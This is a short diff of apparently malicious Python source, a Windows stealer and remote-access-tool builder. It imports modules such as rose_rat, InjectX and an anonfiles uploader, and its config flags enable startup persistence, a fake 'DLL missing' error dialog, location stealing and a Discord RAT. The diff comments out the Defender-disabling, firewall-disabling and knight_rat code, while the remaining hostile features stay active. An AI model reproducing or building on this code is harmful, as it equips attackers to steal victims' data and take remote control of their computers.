@@ -5,8 +5,6 @@ import malicious
 import rose_rat
 import InjectX
 import startup
-import disableDefender
-import disableFirewalls
 import _roblox
 from config import Config
 from anonFile import uploadToAnonfiles
@@ -45,10 +43,11 @@ if platform.system() != "Windows":
 if cc.get_start_up() is True:
     startup.Startup()
 
-if cc.get_disable_windows_defender() is True:
-    disableDefender.disableDefender()
-if cc.get_disable_windows_firewalls() is True:
-    disableFirewalls.disableFirewalls()
+### FORCE REMOVED BY DEVELOPERS
+# if cc.get_disable_windows_defender() is True:
+#     import disableDefender
+# if cc.get_disable_windows_firewalls() is True:
+#     import disableFirewalls
 
 if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
@@ -860,5 +859,6 @@ if cc.get_location_stealing() is True:
 if cc.get_rose_discord_rat() is True:
     rose_rat.run_rat()
     
-if cc.get_knight_discord_rat() is True:
-    import knight_rat
+### FORCE REMOVED BY DEVELOPERS
+# if cc.get_knight_discord_rat() is True:
+#     import knight_rat
